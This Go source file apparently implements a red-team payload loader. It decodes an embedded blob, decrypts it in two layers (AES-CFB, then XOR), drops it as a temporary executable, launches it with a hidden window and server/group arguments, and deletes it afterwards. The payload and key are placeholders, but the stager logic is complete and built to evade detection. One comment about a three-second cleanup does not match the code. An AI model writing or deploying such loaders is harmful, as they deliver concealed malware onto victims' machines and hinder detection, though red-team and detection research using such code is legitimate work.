package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"os"
	"os/exec"
	"syscall"
)

// Encrypted payload will be embedded here at build time
var encryptedPayload = "PAYLOAD_PLACEHOLDER"
var aesKey = "KEY_PLACEHOLDER"

func decrypt(ciphertext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	if len(ciphertext) < aes.BlockSize {
		return nil, err
	}

	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ciphertext, ciphertext)

	return ciphertext, nil
}

func xorDecrypt(data []byte, key byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key
	}
	return result
}

func main() {
	// Decode base64 payload
	encData, err := base64.StdEncoding.DecodeString(encryptedPayload)
	if err != nil {
		os.Exit(1)
	}

	// Decode base64 key
	keyData, err := base64.StdEncoding.DecodeString(aesKey)
	if err != nil {
		os.Exit(1)
	}

	// Decrypt with AES
	decrypted, err := decrypt(encData, keyData)
	if err != nil {
		os.Exit(1)
	}

	// XOR decrypt (second layer)
	finalPayload := xorDecrypt(decrypted, 0x42)

	// Write to temp file
	tmpFile, err := os.CreateTemp("", "*.exe")
	if err != nil {
		os.Exit(1)
	}
	tmpPath := tmpFile.Name()
	tmpFile.Write(finalPayload)
	tmpFile.Close()

	// Get command line args (server, group, etc)
	args := []string{"-server", "SERVERURL", "-group", "red"}
	if len(os.Args) > 1 {
		args = os.Args[1:]
	}

	// Execute payload
	cmd := exec.Command(tmpPath, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()

	// Clean up after 3 seconds
	go func() {
		// Wait a bit then delete
		cmd.Wait()
		os.Remove(tmpPath)
	}()
}
